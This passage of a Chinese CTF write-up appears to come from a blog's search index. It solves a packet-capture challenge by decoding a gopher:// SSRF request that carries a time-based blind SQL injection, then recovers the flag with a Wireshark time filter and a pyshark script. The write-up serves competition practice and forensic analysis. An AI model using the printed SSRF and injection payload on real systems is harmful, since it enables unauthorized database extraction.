src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWIwODZkNjNjZGYyN2Y0OWE0MGY1Yzk5NTBmOTQxZjRfMThFbXpobVR1cHY3SWI5S1RqUUhxdFNOZW5yTlA1bXdfVG9rZW46TUdvNWJUUFlHb2JpME94T2ZyRGNwb1EwbkhiXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWE3NTFmYTNlNTBmNzVhMDM1ZTFhYWJiYjdjNTE0NGJfMUF1QVdtMmF6WmlaSXkxSW56bnlNRGVLUDU2Vkx5OVBfVG9rZW46VnVpVmJLajBhbzVjcVl4ZTR2WWNQMURJbjVmXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>whuctf{2312e27351570365ad521d38ecda5d22}</p><hr><h2 id="Ezpcap"><a href="#Ezpcap" class="headerlink" title="Ezpcap"></a>Ezpcap</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">GET /index.php?url=gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2Fx-www-form-urlencoded%250d%250aContent-Length%3A%2078%250d%250a%250d%250aid%253D1%2529%2520and%2520if%2528%2528ascii%2528substr%2528%2528select%2520flag%2520from%2520flag%2529%252C7%252C1%2529%2529%253D%252767%2527%2529%252Csleep%25283%2529%252C0%2529%2520--%2520<br></code></pre></td></tr></table></figure><p>观察包的规律可以看到，是一个时间盲注加ssrf，所以需要找到时间间隔</p><p>url解码以后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">GET /index.php?url=gopher://127.0.0.1:80/_POST /admin.php HTTP/1.1<br>Host: localhost:80<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 78<br><br>id=1) and if((ascii(substr((select flag from flag),7,1))=&#x27;67&#x27;),sleep(3),0) -- <br></code></pre></td></tr></table></figure><p>可以输入过滤规则找到和前一个tcp包时间间隔为3s以上的包，肯定会冗余一点点，然后在其中继续找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">规则为<br>frame.time_delta&gt;0.018&amp;&amp;http<br></code></pre></td></tr></table></figure><p>得到包序号和对应的注入结果字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs Plain">565<br>f<br>1186<br>l<br>1720<br>a<br>2305<br>g<br>3064<br>&#123;<br>3154<br>1<br>3831<br>q<br>4549<br>w<br>5285<br>y<br>5382<br>2<br>5525<br>7<br>5679<br>8<br>5772<br>1<br>6625<br>&#125;（最后一个得自己找，因为已经结束了没有延时）<br></code></pre></td></tr></table></figure><p>拼接结果</p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>使用pyshark 来解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Plain">import pyshark<br>from datetime import timedelta<br>import re <br><br>cap = pyshark.FileCapture(&quot;challenge.pcapng&quot;, display_filter=&#x27;http&#x27;)<br><br>flag = &#x27;&#x27;<br>p = r&#x27;%2527(\d+)%2527%2529%252Csleep&#x27;<br><br>for pkt in cap:<br>    if int(pkt.length) &lt; 650: # 当包长度小于 650 时为请求包，记录uri 和 时间<br>        time_s = pkt.sniff_time<br>        url = pkt.http.request_full_uri<br>    else:         # 当返回包时长与发送包大于 3 秒时 用正则 将上一条发送包的ULR中时间盲注的字符取出来<br>        if pkt.sniff_time - time_s &gt; timedelta(seconds=3):   <br>            c = re.findall(p, str(url))<br>            flag += chr(int(c[0]))<br>            print(flag)<br></code></pre></td></tr></table></figure><p>flag{1qwy2781}</p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
